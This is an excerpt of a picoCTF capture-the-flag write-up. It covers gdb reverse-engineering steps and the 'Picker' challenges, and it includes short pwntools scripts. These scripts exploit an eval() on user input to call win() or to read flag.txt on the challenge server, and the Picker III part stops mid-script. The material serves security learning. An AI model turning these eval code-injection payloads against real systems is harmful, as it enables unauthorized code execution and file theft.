...
Download the file, make it executable with `chmod +x ./debugger0_a` and open it in `gdb`.
...
We set a breakpoint at `main+15` and print the contents of `$eax`.
...
We set a breakpoint at `main+60`, `run` the program and print the contents of `$eax`.
...
We see the hex values loaded to `$eax` here.
...
We need to take into consideration the `endianness` and reverse the order of the bytes to get the flag.
...
We see that it calls `func1`. We disassemble that.
...
The multiplication occurs here:
```gdb
0x0000000000401114 <+14>:	imul   eax,eax,0x3269
```
...
We see that there is a `win()` function and an `eval()`. `eval()` will call our input with `()`, meaning we can call any function we want. That means, we can call `win()`. After we call it, we hex decode the message to get the flag.
...
r = remote('saturn.picoctf.net', 57369)
r.timeout = 1

r.sendlineafter('==> ', 'win')

enc = r.recvuntil(b'0x7d').split(b' ')

assert len(enc) > 4

print(''.join(chr(int(i.decode(), 16)) for i in enc), end='')
```

### Picker II

Same problem as before with one addition:
...
Now we cannot call `win` directly. Instead, we will open the `flag.txt`, `read` its content and `print` them.
...
r = remote('saturn.picoctf.net', 56222)
r.timeout = 1

r.sendlineafter('==> ', "print(open('flag.txt', 'r').read())#")

r.recvuntil(b'pico')
print(f'pico{r.recvuntil("}").decode()}\n')
```

### Picker III

This file is a bit different than the previous two.
...
We can overwrite a variable, thus a `function` with a value of our choice. Choice `1` calls `print_table()`. We will overwrite this with  `win()`.
...
r = remote('saturn.picoctf.net', 60239)
r.timeout = 0.5
